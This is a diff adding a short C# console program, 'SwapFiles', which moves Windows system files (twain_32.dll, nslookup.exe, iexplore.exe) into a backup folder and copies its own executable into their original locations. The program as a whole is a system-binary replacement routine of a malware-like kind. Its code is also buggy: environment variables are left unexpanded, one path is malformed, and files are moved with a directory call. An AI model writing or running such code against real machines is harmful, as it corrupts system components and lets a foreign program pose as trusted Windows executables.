@@ -1,0 +1,71 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.IO;
+
+
+namespace SwapFiles
+{
+
+    class Program
+    {
+
+        //File.Replace Use this?
+
+        // Function which swaps files
+        static void Swap(string filePath, string fileName)
+        {
+            try
+            {
+                string sourceFile = Path.Combine(filePath, fileName);
+                Console.WriteLine("This is our source file: " + sourceFile);
+                string targetPath = @"C:\Windows\BackUp";
+                string destFile = Path.Combine(targetPath, fileName);
+                Console.WriteLine("This is our source file: " + destFile);
+                // Create location for Backup
+                Console.WriteLine(Directory.Exists(targetPath));
+                if (!Directory.Exists(targetPath))
+                {
+                    Console.WriteLine("In If");
+                    Directory.CreateDirectory(targetPath);
+                }
+
+                //Move file
+                Directory.Move(sourceFile, destFile);
+
+                //Copy app .exe to source folder
+
+                string currentFolder = Environment.CurrentDirectory;
+                string programExe = "SwapFiles.exe";
+                string exeSource = Path.Combine(currentFolder, programExe);
+                string exeDest = Path.Combine(filePath, programExe);
+                File.Copy(exeSource, exeDest);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        static void Main(string[] args)
+        {
+ 
+            //Source of files
+            string pathTwain = @"C:\Windows";
+            string fileTwain = @"twain_32.dll";
+            string pathNslookup = @"%SystemRoot%\System32\";
+            string fileNslookup = @"nslookup.exe";
+            string pathIexplorer = @"%ProgramFiles%\Internet Explorer\iexplore.exe";
+            string fileIexplorer = @"iexplore.exe";
+
+            //Use method for move files to %ProgramFiles%\BackUp 
+            //and copy .exe of program to their location
+            Swap(pathTwain, fileTwain);
+            Swap(pathNslookup, fileNslookup);
+            Swap(pathIexplorer, fileIexplorer);
+
+            Console.ReadKey();
+        }
+    }
+}
